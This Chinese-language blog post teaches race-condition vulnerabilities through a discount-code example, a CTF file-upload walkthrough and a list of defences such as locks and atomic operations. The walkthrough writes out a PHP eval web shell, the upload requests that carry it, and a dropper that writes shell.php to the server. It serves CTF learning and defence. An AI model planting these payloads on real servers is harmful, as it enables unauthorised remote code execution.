        <content type="html"><![CDATA[<h2 id="Web安全条件竞争漏洞学习"><a href="#Web安全条件竞争漏洞学习" class="headerlink" title="Web安全条件竞争漏洞学习"></a>Web安全条件竞争漏洞学习</h2><h4 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h4><p>​条件竞争漏洞发生在多个线程同时访问同一个共享代码、变量、文件等，，由于多个不同线程同时与相同的数据进行交互，从而导致碰撞冲突（例如，后端多个线程同时修改数据库中的某一个字段值）。攻击者通过精心定制请求到达后端的时间故意制造冲突，并由此实现恶意目的。这个漏洞存在于操作系统、数据库、web等多个层面，由于大多服务端框架在处理不同用户的请求时是并发进行的，而开发者在进行代码开发时常常倾向于认为代码会以线性的方式执行，而忽视了并行服务器会并发执行多个线程，这就会导致意想不到的结果。</p><h6 id="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作"><a href="#简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作" class="headerlink" title="简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作"></a>简单来说，就是多线程同时操作一个对象，而没有对对象进行加锁等保证一致性的操作</h6><h4 id="0x01-简单分析"><a href="#0x01-简单分析" class="headerlink" title="0x01 简单分析"></a>0x01 简单分析</h4><p>我们来设计一个简答的业务逻辑：商城系统中，用户提交折扣码，后端会检测用户是否已经使用过折扣码。若未使用过，则使用该折扣码，并记录折扣码使用状态为True。若已使用折扣码，用户再次使用折扣码时，后端程序读取折扣码使用状态为True，拒绝用户再次使用折扣码。</p><p><img src="https://pic2.zhimg.com/80/v2-ffffaa1fb957682cebb626a0482344b3_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>我们在这里用一段简单的python代码来模拟后端逻辑，处理请求的<code>handle_req()</code>函数是并发（多线程&#x2F;多进程）执行的：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> **handle_req**():</span><br><span class="line">    <span class="keyword">if</span> code_already_used = <span class="literal">False</span>: <span class="comment"># 判断如果没有使用过折扣码（实际应该是对数据库的查询，此处简化写法）</span></span><br><span class="line">        use_code()  <span class="comment"># 使用折扣码，对商品进行打折</span></span><br><span class="line">        code_already_used = <span class="literal">True</span>  <span class="comment"># 使用过折扣码后，将折扣码使用状态为True（实际应该是对数据库的数据更新，此处简化写法）</span></span><br><span class="line">    <span class="keyword">else</span>:  <span class="comment"># 若已经使用过折扣码</span></span><br><span class="line">        reject_use_code()        <span class="comment"># 拒绝再次使用折扣码</span></span><br></pre></td></tr></table></figure><p>但是这个过程可能会存在条件竞争漏洞，因为我们第一次请求判断的状态为false即未使用折扣码，但是第一个请求执行到第四行时准备更新数据库内容而第二个请求又开始执行并将折扣码使用状态再一次地标记为false，从而造成了使用了两次折扣码，触发了条件竞争漏洞，如下图所示：后端将记录折扣码使用状态为True之前，可能存在条件竞争，上述第2、3行代码执行的时间就是<code>竞争窗口</code>。</p><p><img src="https://pica.zhimg.com/80/v2-b3ccc0bc7165f6bd90fcf6769c591786_720w.webp" alt="Lesson-eb3846115f6b8"></p><p>　竞争窗口一般是一段很短的时间段（几毫秒甚至更短），用户通过并行发送多个数据包，使得服务端竞争窗口内执行多次特定的功能。</p><p><img src="https://pic4.zhimg.com/80/v2-936e0bec041297e3b7f8b1f0d9f568d1_720w.webp" alt="Lesson-eb3846115f6b8"></p><h4 id="0x02-CTF中的条件竞争"><a href="#0x02-CTF中的条件竞争" class="headerlink" title="0x02 CTF中的条件竞争"></a>0x02 CTF中的条件竞争</h4><p>我们来看这样的一道题目</p><p>【题型】<a href="">Web</a><br>【题目】<code>wzsc_文件上传</code><br>【来源】（[攻防世界](<a href="https://adworld.xctf.org.cn/challenges/list%EF%BC%89">https://adworld.xctf.org.cn/challenges/list）</a><br>【思路】<a href="">条件竞争</a></p><p>我们先上传一个一句话木马并把包拦截下来进行分析测试</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /upload.php HTTP/1.1</span><br><span class="line">Host: Host:Port</span><br><span class="line">Content-Length: 230</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://61.147.171.105:56903</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMwWBoiGSKcfAYxLh</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: Host:Port</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryMwWBoiGSKcfAYxLh</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;file&quot;</span>; filename=<span class="string">&quot;classic.php&quot;</span></span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;shell&quot;</span>]); ?&gt;</span><br><span class="line">------WebKitFormBoundaryMwWBoiGSKcfAYxLh--</span><br></pre></td></tr></table></figure><p>我们把它放到Repeater中放出去看看，查看返回包</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Sat, 08 Feb 2025 09:38:03 GMT</span><br><span class="line">Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br></pre></td></tr></table></figure><p>我们可以看到这里的状态码是200，证明我们是可以成功上传但是在服务器中被删除了，那这时候可以使用以下思路</p><p>我们先尝试访问我们上传的一句话并拦截包</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">GET /upload/classic.php HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:56903</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en-US,en;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>这样，我们可以在<code>BurpSuite</code>中同时拦截下这两个数据包，然后发送至Intruder模块，将payload设置为<code>Null Payload</code>，并开始攻击，这样我们还需要搭配上这样的一句PHP代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&quot;shell.php&quot;</span>, <span class="string">&quot;w&quot;</span>), <span class="string">&#x27;&lt;?php @eval($_POST[&quot;shell&quot;]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>它的作用是只要我们上传的文件能被成功访问，它就能在服务器上新建一个<code>shell.php</code>并将一句话写入，从而使我们能够成功<code>getshel</code>l~</p><p>用两个不同的数据包设置<code>Null Payload</code>的作用是利用我们提到的“竞争窗口”即上传成功到被删除的这一小段时间去访问我们上传的内鬼让其在服务器上生成一个接应我们的shell，其实简单地说就是用两个不同的操作去同时读写一个文件</p><p><img src="https://pic2.zhimg.com/80/v2-98252be57cdc6ace37d120354c2b5da1_720w.webp" alt="4"></p><p>Success to upload！</p><p>成功拿到flag：<code>cyberpeace&#123;This_is_a_sample_flag&#125;</code></p><h4 id="0x03-如何防御？"><a href="#0x03-如何防御？" class="headerlink" title="0x03 如何防御？"></a>0x03 如何防御？</h4><p>以下总结了一些防御方法和常见条件竞争漏洞示例及防御</p><p>(1) 使用同步机制<br>    锁（Lock）：通过加锁确保同一时间只有一个线程或进程可以访问共享资源。<br>    信号量（Semaphore）：限制同时访问资源的线程或进程数量。<br>    互斥量（Mutex）：类似于锁，用于多线程环境。<br>(2) 原子操作<br>    使用原子操作确保操作的不可分割性。<br>    示例：<br>        数据库中的事务（Transaction）。<br>        编程语言中的原子类型（如 atomic 在 C++ 或 Java 中）。<br>(3) 避免共享资源<br>    尽量减少共享资源的使用，采用线程本地存储（Thread Local Storage, TLS）或进程隔离。<br>    示例：<br>        使用线程本地变量代替全局变量。<br>(4) 文件操作防御<br>    使用文件锁（File Lock）确保同一时间只有一个进程可以访问文件。<br>(5) 数据库操作防御<br>    使用事务（Transaction）和锁机制（如行锁、表锁）确保数据一致性。<br>(6) 时间窗口最小化<br>    减少竞争条件的发生概率，尽量缩短共享资源的访问时间。<br>    示例：<br>        在文件操作中，尽快释放文件锁。<br>(7) 使用不可变对象<br>    使用不可变对象（Immutable Objects）避免共享资源被修改。<br>    示例：<br>        在函数式编程中，尽量使用不可变数据结构。<br>(8) 输入验证和边界检查<br>    对用户输入进行严格验证，避免恶意输入触发竞争条件。<br>    示例：<br>        检查文件路径、用户权限等。<br>(9) 代码审查和测试<br>    通过代码审查发现潜在的竞争条件。<br>    使用压力测试和并发测试工具（如 JMeter、Locust）模拟高并发场景。</p><p>常见条件竞争漏洞示例及防御<br>(1) TOCTOU（Time-of-Check to Time-of-Use）</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">漏洞描述：在检查资源状态和使用资源之间存在时间窗口，攻击者可以利用这个时间窗口修改资源状态。</span><br><span class="line"></span><br><span class="line">防御方法：</span><br><span class="line"></span><br><span class="line">    使用原子操作（如 open() 的 O_EXCL 标志）。</span><br><span class="line"></span><br><span class="line">    示例（C 语言）：</span><br><span class="line">    c</span><br><span class="line">    复制</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;file.txt&quot;</span>, O_WRONLY | O_CREAT | O_EXCL, <span class="number">0644</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">// 文件已存在</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>(2) 文件上传漏洞</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">漏洞描述：攻击者在上传文件时，利用时间窗口替换文件内容。</span><br><span class="line"></span><br><span class="line">防御方法：</span><br><span class="line"></span><br><span class="line">    使用临时文件，上传完成后再重命名。</span><br><span class="line"></span><br><span class="line">    示例：</span><br><span class="line">    python</span><br><span class="line">    复制</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">import</span> tempfile</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> tempfile.NamedTemporaryFile(delete=<span class="literal">False</span>) <span class="keyword">as</span> tmp_file:</span><br><span class="line">        tmp_file.write(<span class="string">b&quot;file content&quot;</span>)</span><br><span class="line">        tmp_path = tmp_file.name</span><br><span class="line"></span><br><span class="line">    os.rename(tmp_path, <span class="string">&quot;final_file.txt&quot;</span>)</span><br></pre></td></tr></table></figure><p>(3) 并发修改共享变量</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">漏洞描述：多个线程同时修改共享变量，导致数据不一致。</span><br><span class="line"></span><br><span class="line">防御方法：</span><br><span class="line"></span><br><span class="line">    使用锁或原子操作。</span><br><span class="line"></span><br><span class="line">    示例（Java）：</span><br><span class="line">    java</span><br><span class="line">    复制</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> java.util.concurrent.atomic.AtomicInteger;</span><br><span class="line"></span><br><span class="line">    <span class="type">AtomicInteger</span> <span class="variable">sharedResource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicInteger</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">updateResource</span><span class="params">()</span> &#123;</span><br><span class="line">        sharedResource.incrementAndGet();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h6 id="一些素材来源："><a href="#一些素材来源：" class="headerlink" title="一些素材来源："></a>一些素材来源：</h6><p><a href="https://noa.pages.dev/posts/web_security/race_conditions/">Noah’s Blog</a></p><p><a href="https://chat.deepseek.com/">DeepSeek</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
